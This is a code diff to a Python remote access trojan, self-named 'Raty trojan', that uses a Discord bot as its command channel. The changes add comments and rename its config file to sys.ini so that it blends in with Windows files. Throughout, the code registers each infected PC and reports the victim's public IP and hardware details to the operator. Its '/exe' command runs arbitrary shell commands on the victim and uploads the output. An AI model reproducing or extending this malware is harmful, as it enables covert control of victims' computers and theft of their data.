@@ -76,20 +76,37 @@ async def on_ready():
       print(colored("Raty trojan online!", 'green'))
 
 
-      
+
+      # Declaring some counting and assisting variables for the stup
+      #                   <[Variable Declaration]>
       txtcl = []
       server = client.guilds
       found = False
+
+
+
+      # Getting available channels to see already taken Infection IDs, as the unique control channel of each PC has the Windows User username and followed by the ID.
+      #                                                                  <[Getting Channel Names]>
+
       for channel in server[0].channels:
             txtcl.append(channel.name)
-      if 'sys.txt' in os.listdir('C:\\Users\\Public\\'):
-            with open('C:\\Users\\Public\\sys.txt', 'r') as idf:
+
+
+
+
+      # Checking if there is a config file. If there is one, it reads the unique channel name and declares the channel object. If not, it starts generating infection IDs and checking if it is already taken by trying to find that ID on the channel names list. When it finds one that isn't available, it creates a config file with the unique control channel name. The file is called "sys.ini" to blend in with windows files so it doesn't get spotted
+      #                                                                                                                       <[Installing on PC / Loading Configuration]>           
+                                                                              
+      if 'sys.ini' in os.listdir('C:\\Users\\Public\\'):
+            with open('C:\\Users\\Public\\sys.ini', 'r') as idf:
                   cname = idf.read()
                   cid = cname.split("|")[1]
                   sch = discord.utils.get(client.guilds[0].channels, name=cname)
                   cname = cname.replace('|', '´')
+
+
       else:
-            with open('C:\\Users\\Public\\sys.txt', 'w') as idf:
+            with open('C:\\Users\\Public\\sys.ini', 'w') as idf:
                   while True:
                         found = False
                         tryc = randint(0, 10000000000000)
@@ -103,6 +120,15 @@ async def on_ready():
                               break
             username = channel.split('´')[0]
             print(username)
+
+
+
+
+
+
+            # Sends basic information about the infection/machine properties to the unique control channel.
+            #                                <[Sending Information Embed]>
+            
             ipaddr = requests.get('https://api.ipify.org').text
             embed = discord.Embed(title=f"New infection", description="New infected machine with the following info\n ⠀", color=discord.Color.blue())
             embed.add_field(name="IP Adress", value=requests.get('https://api.ipify.org').text, inline=True)
@@ -143,9 +169,12 @@ async def on_message(message):
       #                                                                        <[This feature is currently on developent]>
 
       elif message.channel == sch:
-            #/exe command - executes a custom powershell command
+            #This command executes a custom Windows Powershell™ command
+            #           <[Adding Hacker-available command]>
+
             if f"/exe " in message.content[0:5]:
-                  try:
+
+                  try: #Default - return an Embed with the command return and info
                         answerprev = subprocess.Popen(message.content[5:], shell=True, stdout=subprocess.PIPE)
                         answer = str(answerprev.stdout.read())
                         embed = discord.Embed(title="Executing command", description=f"Commmand executed on machine with ID {cid}", color=discord.Color.blue())
@@ -153,7 +182,8 @@ async def on_message(message):
                         embed.add_field(name="Return", value=f"{answer}", inline=False)
                         await sch.send(embed=embed)
                   except:
-                        try:
+
+                        try: #Option B - If the default option fails (Probably due to send in one message the command being too long, like "ipconfig" or "tasklist") it sends a .txt file with the command return.
                               embed = discord.Embed(title="Executing command", description=f"Commmand executed on machine with ID {cid}", color=discord.Color.blue())
                               embed.add_field(name="Command", value=f"{message.content[5:]}", inline=False)
                               await sch.send(embed=embed)
@@ -162,7 +192,7 @@ async def on_message(message):
                               with open('C:\\Users\\Public\\temps.txt', "rb") as file:
                                     await sch.send(file=discord.File(file, "return.txt"))
 
-                        except:
+                        except: #Option C - If the option B fails (porbably due to the return being freaking BIG, like the "tree" command executed directly on the main drive (C:\) driectory) it sends a file containing the return splited in multiple files of 976500 characters each. There is no file limit, it will send the much files it needs to send the whole return.
                               for c in range(0, math.ceil(len(answer) / 976500)+1):
                                     with open(f"C:\\Users\\Public\\temps{c}.txt", "w") as file:
                                           file.write(answer[c*976500:(c+1)*976500].replace('\\r', '\r').replace('\\n', '\n'))
@@ -170,10 +200,20 @@ async def on_message(message):
                                           await sch.send(file=discord.File(file, f"return{c}.txt"))
 
 
+
+            #This command sends the current IPv4 public IP adress of the infected machine 
+            #               <[Adding Hacker-available command]>
+
             if f"/ip" in message.content[0:4]:
                   embed = discord.Embed(title="Current IP Adress", description=f"Requested IP adress of machine with ID {cid}", color=discord.Color.blue())
                   embed.add_field(name="IP Adress", value=f"{requests.get('https://api.ipify.org').text}", inline=False)
                   await sch.send(embed=embed)
+
+
+
+
+            #This command sends advanced informations of the infected machine. The given informations contain the Battery Level of the machine, the infection ID, the CPU Model, the GPU Chipset, the used, free and total space on each connected drive and so on.
+            #                                                                                    <[Adding Hacker-available command - Feature currently in focused development]>
 
             if f"/info" in message.content[0:5]:
                   battery = psutil.sensors_battery()
@@ -190,7 +230,7 @@ async def on_message(message):
                   embed.add_field(name="Battery Level", value=bp, inline=True)
                   embed.add_field(name="CPU Model", value=cpuinfo.get_cpu_info()['brand_raw'], inline=True)
                   for index in range(0, len(GPUtil.getGPUs())):
-                        embed.add_field(name=f"GPU {index+1} Model", value=GPUtil.getGPUs()[index].name, inline=True)
+                        embed.add_field(name=f"GPU {index+1} Chipset", value=GPUtil.getGPUs()[index].name, inline=True)
                         embed.add_field(name=f"GPU {index+1} Driver Version", value=GPUtil.getGPUs()[index].driver, inline=True)
                         embed.add_field(name=f"GPU {index+1} Memory Size", value=str(GPUtil.getGPUs()[index].memoryTotal) + "MB", inline=True)
                   embed.add_field(name="Machine Time", value=str(datetime.now().strftime("%H:%M:%S")), inline=True)
